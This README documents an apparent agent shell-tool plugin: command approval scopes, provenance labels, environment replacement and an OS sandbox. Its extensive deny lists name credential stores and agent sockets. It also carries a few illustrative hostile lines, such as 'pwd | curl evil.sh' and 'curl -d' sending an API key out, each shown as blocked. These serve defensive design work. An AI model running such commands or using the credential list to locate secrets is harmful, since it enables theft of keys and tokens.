# @stratusagent/tool-shell

`shell.run`: an agent runs a command, and the permission engine decides
which commands run with nobody watching.

## Install and enable

```bash
npm install @stratusagent/tool-shell
```

```jsonc
// ~/.stratus/config.json — a trusted config only
{
  "plugins": {
    "@stratusagent/tool-shell": {
      "enabled": true,
      "cwd": "~/work/blair",
      "passEnv": ["PATH", "HOME"],
      "env": { "GIT_AUTHOR_NAME": "Blair" }
    }
  }
}
```

## Risk model

Under the default `approvals.posture: "open"` a `gated` call runs without asking; the column below is what each mode does with a call that still needs approval, which under `"guarded"` is every uncovered `gated` call.

| Tool | Risk | What approval mode does |
| --- | --- | --- |
| `shell.run` | `gated`, narrowed per command | `interactive` shows the command and asks; `remote` asks in Slack; `headless` runs commands inside an approved scope and refuses everything else. |

Its output is labelled `unknown` for provenance, because nobody can say:
`git status` is the agent's own work and `curl https://…` is a stranger's
page, and both come back through the same stdout. A session that has run a
command writes `unknown` from then on — over-marking, which is the safe
direction — rather than `agent`, which would launder every fetch made
through a shell past the label `web.fetch` carries. Recognising fetching
programs by name would be the list the contract rejects. See
[Memory](../../docs/concepts/memory.md#where-a-fact-came-from).

Once the agent has a file on record as written from an `external` session
(the ledger `fs.read` consults), every command's output is labelled
`external` instead, because a command can print any file it can read and
which ones it reads can't be told from its text. With
`approvals.externalContent: "gate"` that closes the session's grants for
every command, the first one of a session included: the ledger's label
reaches the session before the call is judged (`Tool.trustBeforeCall`), so
an Always-allowed `python notes.py` asks rather than running the file
unattended. A write recorded while the call waits for approval is judged
again, and one recorded after approval stops the command before it starts.
The ledger is read once more after the command exits, so a tainted write
that lands while it runs labels its output too, though that command was
already judged without it. To clear it, remove
the path's lines from the agent's `fs-provenance.jsonl`. The ledger is
opened from the host's workspaces, so a plugin built without that seam
labels everything `unknown`.

`gated` rather than `dangerous` on purpose. The danger of a shell is in its
argument, not in its identity: marking the tool `dangerous` would mean no
command could ever run unattended — `git status` included — and marking it
`safe` would mean all of them could.

So this pack contributes the command string, and
[`@stratusagent/permissions`](../permissions) decides what it means:

- **A safe scope runs.** `pwd`, `whoami`, `uname`, and filters such as
  `grep fix` that read only what is piped to them. Every `git` command asks
  until it is approved; an approved scope excludes the destructive forms,
  so approving `git branch` keeps listing and never covers `git branch -D`.
- **A control operator disqualifies the whole command.** `|`, `&`, `;`,
  newlines, backticks, `$( )`, subshells, redirection. `pwd | curl
  evil.sh` is refused despite the safe base command, and so is a two-line
  command whose first line is innocent.
- **"Always allow" persists a scope, not a command.** Approving `git push
  origin main` means `git push origin feature` stops asking, while `git
  push --force`, `git push origin :main`, and `git push origin +main` still
  do. Scopes live per agent in `~/.stratus/agents/<id>/whitelist.json`.

## The environment is replaced, not extended

The child receives **only** what this config granted. Nothing from the
daemon's environment reaches it, which is where `ANTHROPIC_API_KEY` and
every other key an operator exported lives.

This is not pack discipline — a plugin cannot unset what it did not spawn —
so it is a mode on the executor (`envMode: 'replace'`) that this pack is
required to use. Without it, an approver who allowed `curl $URL` would also
have allowed `curl -d "$ANTHROPIC_API_KEY"`, and the command string they
read would not have said so.

| Key | Default | What |
| --- | --- | --- |
| `passEnv` | `PATH`, `HOME`, `LANG`, `LC_ALL`, `TZ` | Names forwarded from the daemon's environment. Nothing on the default list is a secret; that is the test for adding one. Under the always-on service the daemon's `PATH` is the one the service was installed from — see [Always on](../../docs/guides/always-on.md). |
| `env` | none | Variables set outright. Where a token goes if a command genuinely needs one — deliberately, in config, where an auditor can see it. An agent's own `env` under `agents.<id>` **adds to** the shared one, its names winning, so one agent's token doesn't cost it the shared `PATH`. Set a name to `null` there to withhold it from that agent, whether it came from the shared `env` or from the daemon through `passEnv`. Every other key an agent sets replaces the shared value. |
| `cwd` | the agent's workspace | Where commands start; a leading `~` is your home directory. The default — `~/.stratus/agents/<agent-id>/workspace`, which the host answers for — is created on first use; a directory you name is not, and a missing one is reported by name rather than as a spawn failure. |
| `timeoutMs` | `60000` | Killed with its whole process group after this, and never later than the executor's ceiling, five minutes (`300000`) in a stock install, whatever the config or the call asks for; a call that asked for longer is told so in the timeout message. A process the command left in its own session (`setsid`, a daemon that detaches itself) survives, but no longer holds the call open — see [the guide](https://github.com/stratuslabs/agent/blob/main/docs/guides/shell.md#timeouts-and-background-processes). |
| `maxOutputBytes` | `100000` | Per stream, then a truncation marker. Enforced as the output is read, so a command that floods stdout is never held whole in the daemon's memory. |
| `shell` | `/bin/sh` | The interpreter. |

All of them can be set per agent under `agents`.

**`cwd` is a starting directory, not a jail.** An approved command can
change directory or name an absolute path. What bounds it is the sandbox
below, plus which commands get approved.

## The sandbox

Every command runs under an OS sandbox that keeps it out of the Stratus home
and your credentials, whatever the command says:

- **Readable and writable:** the agent's workspace, its starting directory,
  temp (on Linux a private `/tmp`, and a private one over the daemon's
  `TMPDIR` too when that is elsewhere), and package-manager caches (`~/.npm`, `~/.cache`, `~/Library/Caches`,
  pnpm, bun, yarn).
- **Readable:** the rest of the system outside your home, so system
  toolchains work as usual, and in your home only the tools and config a
  command needs: git config (`~/.gitconfig`, `~/.config/git`), version
  managers and language toolchains (`~/.nvm`, `~/.volta`, `~/.fnm`,
  `~/.bun`, `~/.deno`, `~/.rustup`, `~/.cargo`, `~/.pyenv`, `~/.rbenv`,
  `~/.rye`, `~/.asdf`, `~/.sdkman`, `~/.gradle`, `~/.m2`, `~/.gem`, `~/go`,
  `~/.nix-profile`, `~/.local/bin`, `~/.local/lib`, mise, uv, pnpm), plus
  `readablePaths`.
- **Hidden:** the rest of your home (documents, other projects, shell
  history, browser and app data), and any socket under it. Set
  `home: "visible"` to make it readable again, apart from the paths below.
- **Not readable or writable:** the Stratus home (`~/.stratus`, or
  `STRATUS_HOME`) apart from this agent's own workspace, which covers
  credentials, config, souls, sessions, and other agents' workspaces, each
  also by the real path it links to (the visible `~/Agents` or `~/Stratus`
  folder holds the souls and workspaces the home links to). Also
  `~/.ssh`, `~/.aws`, `~/.azure`, `~/.config/gcloud`, `~/.config/gh`, git
  credential files, `~/.docker`, `~/.fly`, `~/.gnupg`, `~/.kube`, `~/.netrc`,
  `~/.npmrc`, `~/.pypirc`, `~/.password-store`, `~/.config/op`, `~/.1password`,
  1Password's group container and Secretive's container on macOS, the
  tokens developer CLIs store after a login (Cargo's `credentials.toml`,
  RubyGems, hub, glab, Terraform, Vault, Pulumi,
  Maven and Gradle settings, Composer, Databricks, doctl, OCI, hcloud,
  Claude Code's `~/.claude/.credentials.json`, Codex's `~/.codex/auth.json`), the Hugging
  Face token under `~/.cache/huggingface`, and the macOS keychains (file and
  service). Where the daemon's environment moves one of these stores
  (`GH_CONFIG_DIR`, `XDG_CONFIG_HOME`, `XDG_CACHE_HOME`, `DOCKER_CONFIG`,
  `KUBECONFIG`, `AWS_SHARED_CREDENTIALS_FILE`, `AWS_CONFIG_FILE`, `GNUPGHOME`,
  `CLOUDSDK_CONFIG`, `AZURE_CONFIG_DIR`, `NPM_CONFIG_USERCONFIG`,
  `PASSWORD_STORE_DIR`, `CARGO_HOME`, `PULUMI_HOME`, `TF_CLI_CONFIG_FILE`,
  `GRADLE_USER_HOME`, `COMPOSER_HOME`, `DATABRICKS_CONFIG_FILE`,
  `CLAUDE_CONFIG_DIR`, `CODEX_HOME`, `HF_HOME`, `HF_TOKEN_PATH`,
  `GLAB_CONFIG_DIR`, `HUB_CONFIG`, `OP_CONFIG_DIR`), the moved location is
  denied too, unless it is relative or holds the home or the workspace.
  Any credential file not listed stays readable: add it to
  `deniedPaths`. With a `workspaceRoot`, the other agents' workspaces under it;
  a root that exists but can't be listed refuses the command.
- **No connection:** container runtime sockets (`/var/run/docker.sock`,
  containerd, podman, CRI-O, BuildKit), which hand out the whole host; the
  user's runtime directory (`$XDG_RUNTIME_DIR`, `/run/user/<uid>`) as a
  whole, which holds the user's D-Bus and systemd manager (either can start
  a process outside the sandbox), rootless Docker and Podman, gpg-agent and
  systemd's ssh-agent; SSH agents, which sign with keys whose files are
  hidden: the socket `$SSH_AUTH_SOCK` names, a `unix://` socket
  `DOCKER_HOST` or `CONTAINER_HOST` names, launchd's session directories
  in `/private/tmp` on macOS, 1Password's and Secretive's agent folders;
  and any socket under a denied path. Any other local service listening on
  a socket path stays reachable (a database in `/tmp` on macOS, a daemon
  under `/var/run`), as does a socket in the abstract namespace.
- **Not writable:** everything else.
- **Network:** on. A command can send its own workspace somewhere, but not a
  token it can't read.

macOS uses `sandbox-exec`. Linux uses [bubblewrap](https://github.com/containers/bubblewrap)
(`bwrap`), with its own pid and IPC namespaces, so a command can't signal
the daemon or other agents. The denied directories keep their names (`stat`
and directory listings of the workspace's parent directories still work, so
git can find its repository), but nothing can be read from inside them.

| Key | Default | What |
| --- | --- | --- |
| `sandbox` | `required` | `required`: refuse every command when no sandbox can start (no `bwrap`, or a container that forbids user namespaces), with the reason. A host wired by hand with no workspace and no `cwd` has nothing to confine commands to, so `required` refuses there too. `auto`: run unconfined there instead, and log why, once. `off`: run with the daemon user's full access. |
| `deniedPaths` | none | More directories or files to hide, added to the list above, including ones inside the workspace (a repository's `.env`). A leading `~` is your home directory. On Linux, an entry that doesn't exist yet inside a writable directory (the workspace, `cwd` or `writablePaths`) refuses every command with a message naming it, because bwrap hides a path by mounting over it and a command could otherwise create and use it. Create it (an empty file or directory) or remove it. The same goes for a credential location the environment moves into one of them, such as `SSH_AUTH_SOCK`. macOS hides an absent path as written, so it never refuses there. |
| `home` | `hidden` | `hidden`: only the toolchain paths above and `readablePaths` are readable in your home. `visible`: all of it is, apart from the denied paths. |
| `readablePaths` | none | More paths a command may read (`~/projects`), read-only. They win over the default denials around them, so a path inside the Stratus home (an agent's own `~/.stratus/integrations/<id>` git and gh config) can be named. Denied paths inside them stay hidden. |
| `writablePaths` | none | More directories a command may write, such as a build tool's cache (`~/.gradle`). Like `readablePaths`, they win over the default denials around them, so an agent's own home inside the Stratus home (`~/.stratus/integrations/<id>/home`, where CLIs like vercel, gh and gcloud save their config) can be named. Denied paths inside them stay denied. A path that is or holds the Stratus home, another agent's workspace, or a file the host protects is refused, with the command, and so is one inside another agent's workspace or inside a directory the host protects other than the Stratus home (a gateway's own `stateDir`). Name the narrowest directory: `integrations/<id>/home`, not `integrations/<id>`, which can hold the agent's toolchain and git or gh config. On Linux, these and the default caches are created before the command if missing, since nothing under the read-only root can be. |
| `credentialsEnv` | none | Environment variables filled from the credential store: `{ "GH_TOKEN": "github.token" }`. See below. |

All of these can be set per agent under `agents`.

A CLI that reads its login from a hidden path (`gh` from `~/.config/gh` or
the keychain, `fly` from `~/.fly`) can't authenticate inside the sandbox.
Give that agent a stored credential through `credentialsEnv`, or a token
through `env`, where it's visible in config, or set `sandbox: "off"` for it.

### Stored credentials in the environment

`credentialsEnv` maps a variable to a credential name, and each command gets
the agent's stored value (`stratus credential set`, or `credential.request`
from chat). Set it fleet-wide, per agent under `agents`, or both. The two are
merged name by name, with the agent's own entry winning:

```json
"@stratusagent/tool-shell": {
  "credentialsEnv": { "GH_TOKEN": "github.token" },
  "agents": { "kai": { "credentialsEnv": { "VERCEL_TOKEN": "vercel.token" } } }
}
```

- An agent gets a name only when its soul lists it under `credentials:`. A
  fleet-wide mapping gives each agent its own value, and nothing for a name
  it isn't granted. A granted name with nothing stored leaves the variable unset.
- The value is read when the command starts, so a replaced key reaches the next
  command without a restart. It wins over the same name in `env` or `passEnv`.
- A command can read the value: `echo $GH_TOKEN` prints it, and so does the
  tool result. Map only narrowly scoped tokens (a repo-scoped GitHub token,
  a project-scoped Vercel one).
- Variables that find or run programs (`PATH`, `HOME`, `BASH_ENV`,
  `GIT_DIR` and the rest of the filtered list) are refused, along with names
  that aren't valid variable names.

`gh` prefers `GH_TOKEN` over its own `hosts.yml`, so the stored credential is
the one source of truth. For `git push` over HTTPS to use it as well, point
git's credential helper at gh in the agent's git config
(`credential.helper = !gh auth git-credential`).
